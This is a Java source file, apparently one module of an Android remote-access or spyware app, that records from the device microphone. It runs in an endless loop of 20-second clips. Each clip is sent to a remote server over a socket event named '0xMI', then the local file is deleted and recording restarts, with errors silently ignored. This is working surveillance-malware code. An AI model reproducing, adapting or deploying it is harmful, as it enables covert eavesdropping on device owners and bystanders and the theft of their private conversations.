package com.remote.app;

import android.media.MediaRecorder;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

public  class AudioRecorder {


    static MediaRecorder recorder;
    static File audiofile = null;
    static final String TAG = "MediaRecording";
    static TimerTask stopRecording;


    public static void startRecording(long sec) throws Exception {


        //Creating file
        File dir = MainService.getContextOfApplication().getCacheDir();
        try {
            Log.e("DIRR" , dir.getAbsolutePath());
            
            
            audiofile = File.createTempFile("audio", ".mp3", dir);
        } catch (IOException e) {
            Log.e(TAG, "external storage access error");
            return;
        }
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setOutputFile(audiofile.getAbsolutePath());
        try{
        recorder.prepare();
        }
        catch (Exception e) {
       

        }
        recorder.start();


        stopRecording = new TimerTask() {
            @Override
            public void run() {
                //stopping recorder

                recorder.stop();
                recorder.release();
                sendVoice(audiofile);
                audiofile.delete();
                try{
                 startRecording(10);

                }
                catch(Exception e){

                }

            }
        };

        new Timer().schedule(stopRecording, 20000);


        
    }

    private static void sendVoice(File file){

        int size = (int) file.length();
        byte[] data = new byte[size];
        try {
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            buf.read(data, 0, data.length);
            JSONObject object = new JSONObject();
            object.put("file",true);
            object.put("name",file.getName());
            object.put("buffer" , data);
            IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
            buf.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }

    }


}



